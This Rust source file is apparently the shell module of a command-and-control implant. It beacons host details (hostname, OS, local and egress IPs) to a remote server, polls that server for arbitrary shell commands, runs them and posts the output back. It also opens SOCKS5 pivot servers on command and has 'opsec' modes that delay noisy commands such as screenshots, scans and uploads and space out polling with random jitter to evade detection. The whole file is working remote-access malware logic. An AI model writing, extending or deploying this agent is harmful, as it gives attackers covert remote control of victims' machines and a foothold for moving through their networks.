use crate::config::AgentConfig;
use crate::networking::egress::get_egress_ip;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{OPSEC_STATE, AgentMode, determine_agent_mode};
use crate::util::random_jitter;
use get_if_addrs::get_if_addrs;
use hostname;
use log::{info, error, debug};
use once_cell::sync::Lazy;
use os_info;
use reqwest::StatusCode;
use serde_json::json;
use std::collections::HashMap;
use std::env;
use std::io;
use std::path::Path;
use std::process::Command;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
use tokio::sync::Mutex as TokioMutex;
use tokio::sync::mpsc;
use tokio::task::JoinHandle;
use tokio::time::timeout;


static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));

#[cfg(windows)]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd.args(args);
    cmd
}

#[cfg(not(windows))]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(command);
    cmd.args(args);
    cmd
}

fn get_all_local_ips() -> Vec<String> {
    let mut ips = Vec::new();
    if let Ok(ifaces) = get_if_addrs() {
        for iface in ifaces {
            match iface.addr {
                get_if_addrs::IfAddr::V4(v4) => {
                    if !v4.ip.is_loopback() {
                        ips.push(v4.ip.to_string());
                    }
                }
                get_if_addrs::IfAddr::V6(v6) => {
                    if !v6.ip.is_loopback() {
                        ips.push(v6.ip.to_string());
                    }
                }
            }
        }
    }
    ips
}

async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    // Handle cd command specially
    if cmd_parts[0] == "cd" {
        if let Some(dir) = cmd_parts.get(1) {
            let path = Path::new(dir);
            if path.exists() {
                env::set_current_dir(path)?;
                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
            } else {
                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
            }
        }
        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
    }

    // Handle other commands with timeout
    let result = timeout(Duration::from_secs(30), async {
        let output = if cfg!(windows) {
            let full_command = cmd_parts.join(" ");
            create_command(&full_command, &[]).output()?
        } else {
            create_command(cmd_parts[0], &cmd_parts[1..]).output()?
        };

        Ok::<_, io::Error>(format!("{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)))
    }).await;

    match result {
        Ok(Ok(output)) => Ok(output),
        Ok(Err(e)) => Err(e),
        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
    }
}

// Send heartbeat to the server
async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
    info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    let client = config.build_http_client()?;
    
    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();
    let ip_list = get_all_local_ips();
    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };
    let egress_ip = get_egress_ip(server_addr);

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "ip": ip,
        "ip_list": ip_list,
        "egress_ip": egress_ip,
        "commands": Vec::<String>::new()
    });

    let response = client.post(&url)
        .json(&data)
        .send()
        .await
        .map_err(|e| {
            error!("[HTTP] Heartbeat POST failed: {}", e);
            io::Error::new(io::ErrorKind::Other, e)
        })?;
    info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
    if !response.status().is_success() {
        error!("[HTTP] Heartbeat failed with status: {}", response.status());
        return Err(io::Error::new(io::ErrorKind::Other, 
            format!("Heartbeat failed with status: {}", response.status())));
    }
    Ok(())
}

// Fetch command from the server
async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
    let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
    info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    let client = config.build_http_client()?;
    let response = client.get(&url)
        .send()
        .await
        .map_err(|e| {
            error!("[HTTP] Command GET failed: {}", e);
            io::Error::new(io::ErrorKind::Other, e)
        })?;
    info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
    if response.status() == StatusCode::NO_CONTENT {
        return Ok(None);
    }
    if !response.status().is_success() {
        error!("[HTTP] Command fetch failed with status: {}", response.status());
        return Err(io::Error::new(io::ErrorKind::Other, 
            format!("Command fetch failed with status: {}", response.status())));
    }

    #[derive(serde::Deserialize)]
    struct CommandResponse {
        command: String,
    }

    let cmd_resp = response.json::<CommandResponse>()
        .await
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    
    Ok(Some(cmd_resp.command))
}

// Submit result to the server
async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
    let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
    info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    let client = config.build_http_client()?;
    let data = json!({
        "command": command,
        "output": output
    });

    let response = client.post(&url)
        .json(&data)
        .send()
        .await
        .map_err(|e| {
            error!("[HTTP] Result POST failed: {}", e);
            io::Error::new(io::ErrorKind::Other, e)
        })?;
    info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
    if !response.status().is_success() {
        error!("[HTTP] Result submission failed with status: {}", response.status());
        return Err(io::Error::new(io::ErrorKind::Other, 
            format!("Result submission failed with status: {}", response.status())));
    }

    Ok(())
}

// Check if the command should be executed based on the current opsec mode
async fn should_execute_command(cmd: &str) -> bool {
    let mode = OPSEC_STATE.lock().unwrap().mode;
    debug!("[OPSEC] should_execute_command: mode={:?}, cmd={}", mode, cmd);
    match mode {
        AgentMode::FullOpsec => {
            // Only allow ultra-quiet commands, skip noisy ones
            if cmd.starts_with("screenshot") || cmd.starts_with("scan") || cmd.starts_with("upload") {
                log::debug!("[OPSEC] FullOpsec: Skipping noisy command: {}", cmd);
                return false;
            }
            true
        }
        AgentMode::BackgroundOpsec => true,
    }
}

// Main function to run the shell
pub async fn run_shell(
    server_addr: &str,
    agent_id: &str,
    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let config = AgentConfig::load()?;
        info!("[SHELL] Starting shell with agent ID: {}", agent_id);
        send_heartbeat_with_client(&config, server_addr, agent_id).await?;
        
        loop {
            let mode = determine_agent_mode();
            let (base, jitter) = match mode {
                AgentMode::FullOpsec => (900, 1800),         // 15–45 min
                AgentMode::BackgroundOpsec => (120, 180),     // 2–5 min
            };
            let sleep_time = random_jitter(base, jitter);

            info!("[SHELL] Polling for commands...");
            match get_command_with_client(&config, server_addr, agent_id).await? {
                Some(command) => {
                    info!("[SHELL] Received command: {}", command);

                    if command.starts_with("pivot_start ") {
                        if let Ok(port) = command["pivot_start ".len()..].trim().parse::<u16>() {
                            // You need to get pivot_handler and pivot_tx here (see step 4)
                            let msg = start_pivot_server(port, pivot_handler.clone(), pivot_tx.clone()).await
                                .unwrap_or_else(|e| e);
                            let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
                            continue;
                        }
                    }
                    if command.starts_with("pivot_stop ") {
                        if let Ok(port) = command["pivot_stop ".len()..].trim().parse::<u16>() {
                            let msg = stop_pivot_server(port).await.unwrap_or_else(|e| e);
                            let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
                            continue;
                        }
                    }                
                    
                    if should_execute_command(&command).await {
                        let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                        
                        match execute_command(&cmd_parts).await {
                            Ok(output) => {
                                if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
                                    error!("[SHELL] Failed to submit result: {}", e);
                                } else {
                                    info!("[SHELL] Result submitted successfully");
                                }
                            }
                            Err(e) => {
                                let error_msg = format!("Command failed: {}", e);
                                if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
                                    error!("[SHELL] Failed to submit error result: {}", e);
                                }
                                error!("[SHELL] Shell error: {}. Retrying...", e);
                            }
                        }
                    } else {
                        QUEUED_COMMANDS.lock().unwrap().push(command.clone());
                        continue;
                    }
                }
                None => {
                    tokio::time::sleep(Duration::from_secs(sleep_time)).await;
                }
            }
        }
}

// Start a pivot server on the specified port
// This function is called when the command "pivot_start <port>" is received
async fn start_pivot_server(
    port: u16,
    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if servers.contains_key(&port) {
        return Err(format!("Pivot server already running on port {}", port));
    }
    let server = Socks5PivotServer::new("127.0.0.1".to_string(), port, pivot_tx);
    let handler = pivot_handler.clone();
    let handle = tokio::spawn(async move {
        server.run(handler).await;
    });
    servers.insert(port, handle);
    Ok(format!("Started pivot server on port {}", port))
}

// Stop a pivot server on the specified port
// This function is called when the command "pivot_stop <port>" is received
async fn stop_pivot_server(port: u16) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if let Some(handle) = servers.remove(&port) {
        handle.abort();
        Ok(format!("Stopped pivot server on port {}", port))
    } else {
        Err(format!("No pivot server running on port {}", port))
    }
}

fn is_noisy_command(cmd: &str) -> bool {
    // Add more as needed
    cmd.starts_with("screenshot") || cmd.starts_with("scan") || cmd.starts_with("upload") || cmd.starts_with("download")
}

pub async fn handle_command(command: &str) {
    let mode = OPSEC_STATE.lock().unwrap().mode;
    match mode {
        AgentMode::FullOpsec => {
            if is_noisy_command(command) {
                debug!("[OPSEC] FullOpsec: Queuing noisy command: {}", command);
                QUEUED_COMMANDS.lock().unwrap().push(command.to_string());
                return;
            }
            // Execute quiet command immediately
            let cmd_parts: Vec<&str> = command.split_whitespace().collect();
            execute_command(&cmd_parts).await;
        }
        AgentMode::BackgroundOpsec => {
            // Execute immediately
            let cmd_parts: Vec<&str> = command.split_whitespace().collect();
            execute_command(&cmd_parts).await;
            // Drain and execute queued commands
            let mut queue = QUEUED_COMMANDS.lock().unwrap();
            for cmd in queue.drain(..) {
                debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
                execute_command(&cmd_parts).await;
            }
        }
    }
}
